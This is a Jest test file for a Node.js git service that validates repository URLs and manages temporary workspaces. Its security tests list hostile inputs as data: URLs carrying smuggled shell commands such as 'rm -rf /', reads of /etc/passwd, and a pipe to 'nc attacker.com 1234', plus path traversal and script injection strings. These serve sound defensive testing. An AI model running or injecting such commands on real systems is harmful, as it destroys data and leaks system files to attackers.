'use strict';

const gitService = require('../gitService');
const fs = require('fs').promises;
const path = require('path');
const os = require('os');

describe('GitService', () => {
  describe('validateGitUrl', () => {
    test('should accept valid GitHub HTTPS URLs', () => {
      expect(gitService.validateGitUrl('https://github.com/user/repo.git')).toBe(true);
      expect(gitService.validateGitUrl('https://github.com/user/repo')).toBe(true);
    });

    test('should accept valid GitLab HTTPS URLs', () => {
      expect(gitService.validateGitUrl('https://gitlab.com/user/repo.git')).toBe(true);
      expect(gitService.validateGitUrl('https://gitlab.com/group/subgroup/repo.git')).toBe(true);
    });

    test('should accept valid Bitbucket HTTPS URLs', () => {
      expect(gitService.validateGitUrl('https://bitbucket.org/user/repo.git')).toBe(true);
    });

    test('should accept valid SSH URLs', () => {
      expect(gitService.validateGitUrl('git@github.com:user/repo.git')).toBe(true);
      expect(gitService.validateGitUrl('git@gitlab.com:user/repo.git')).toBe(true);
    });

    test('should reject URLs with dangerous characters', () => {
      expect(gitService.validateGitUrl('https://github.com/user/repo.git; rm -rf /')).toBe(false);
      expect(gitService.validateGitUrl('https://github.com/user/repo.git && malicious')).toBe(false);
      expect(gitService.validateGitUrl('https://github.com/user/repo.git | cat /etc/passwd')).toBe(false);
      expect(gitService.validateGitUrl('https://github.com/user/repo.git`whoami`')).toBe(false);
      expect(gitService.validateGitUrl('https://github.com/user/repo.git$(whoami)')).toBe(false);
    });

    test('should reject invalid URL formats', () => {
      expect(gitService.validateGitUrl('not-a-url')).toBe(false);
      expect(gitService.validateGitUrl('ftp://github.com/user/repo.git')).toBe(false);
      expect(gitService.validateGitUrl('')).toBe(false);
      expect(gitService.validateGitUrl(null)).toBe(false);
      expect(gitService.validateGitUrl(undefined)).toBe(false);
      expect(gitService.validateGitUrl(123)).toBe(false);
    });

    test('should reject URLs with path traversal attempts', () => {
      expect(gitService.validateGitUrl('https://github.com/../../../etc/passwd')).toBe(false);
      expect(gitService.validateGitUrl('https://github.com/user/../../repo.git')).toBe(false);
    });
  });

  describe('sanitizeUrl', () => {
    test('should trim whitespace from URLs', () => {
      expect(gitService.sanitizeUrl('  https://github.com/user/repo.git  ')).toBe('https://github.com/user/repo.git');
      expect(gitService.sanitizeUrl('\nhttps://github.com/user/repo.git\n')).toBe('https://github.com/user/repo.git');
    });
  });

  describe('generateWorkspace', () => {
    test('should generate unique workspace IDs', () => {
      const workspace1 = gitService.generateWorkspace();
      const workspace2 = gitService.generateWorkspace();

      expect(workspace1.workspaceId).toBeDefined();
      expect(workspace2.workspaceId).toBeDefined();
      expect(workspace1.workspaceId).not.toBe(workspace2.workspaceId);
    });

    test('should generate valid workspace paths', () => {
      const workspace = gitService.generateWorkspace();
      
      expect(workspace.workspacePath).toBeDefined();
      expect(workspace.workspacePath).toContain(workspace.workspaceId);
      expect(path.isAbsolute(workspace.workspacePath)).toBe(true);
    });

    test('should generate UUIDs in correct format', () => {
      const workspace = gitService.generateWorkspace();
      const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
      
      expect(uuidRegex.test(workspace.workspaceId)).toBe(true);
    });
  });

  describe('fetchRepository', () => {
    test('should reject invalid URLs', async () => {
      await expect(gitService.fetchRepository('invalid-url')).rejects.toThrow('Invalid or potentially unsafe');
      await expect(gitService.fetchRepository('https://github.com/user/repo.git; rm -rf /')).rejects.toThrow('Invalid or potentially unsafe');
    });

    test('should reject empty URLs', async () => {
      await expect(gitService.fetchRepository('')).rejects.toThrow('Invalid or potentially unsafe');
      await expect(gitService.fetchRepository('   ')).rejects.toThrow('Invalid or potentially unsafe');
    });

    test('should reject null/undefined URLs', async () => {
      await expect(gitService.fetchRepository(null)).rejects.toThrow('Invalid or potentially unsafe');
      await expect(gitService.fetchRepository(undefined)).rejects.toThrow('Invalid or potentially unsafe');
    });

    // Note: Actual cloning tests would require a real repository or mocking
    // For production testing, use a small public test repository
  });

  describe('cleanupWorkspace', () => {
    test('should reject paths outside base directory', async () => {
      const maliciousPath = '/etc/passwd';
      await gitService.cleanupWorkspace(maliciousPath);
      // Should not throw, but should not delete the file either
      // This is a safety test - cleanup should fail silently for invalid paths
    });

    test('should handle non-existent paths gracefully', async () => {
      const nonExistentPath = path.join(os.tmpdir(), 'codeguard-repos', 'non-existent-workspace');
      await expect(gitService.cleanupWorkspace(nonExistentPath)).resolves.not.toThrow();
    });
  });

  describe('Security Tests', () => {
    test('should prevent command injection via URL', () => {
      const maliciousUrls = [
        'https://github.com/user/repo.git; rm -rf /',
        'https://github.com/user/repo.git && cat /etc/passwd',
        'https://github.com/user/repo.git | nc attacker.com 1234',
        'https://github.com/user/repo.git`whoami`',
        'https://github.com/user/repo.git$(id)',
        'https://github.com/user/repo.git${PATH}',
        'https://github.com/user/repo.git<script>alert(1)</script>',
        'https://github.com/user/repo.git{test}',
        'https://github.com/user/repo.git[test]'
      ];

      maliciousUrls.forEach(url => {
        expect(gitService.validateGitUrl(url)).toBe(false);
      });
    });

    test('should prevent path traversal in workspace generation', () => {
      const workspace = gitService.generateWorkspace();
      const baseDir = path.join(os.tmpdir(), 'codeguard-repos');
      
      expect(workspace.workspacePath.startsWith(baseDir)).toBe(true);
      expect(workspace.workspacePath).not.toContain('..');
      expect(workspace.workspacePath).not.toContain('~');
    });
  });
});

// Made with Bob
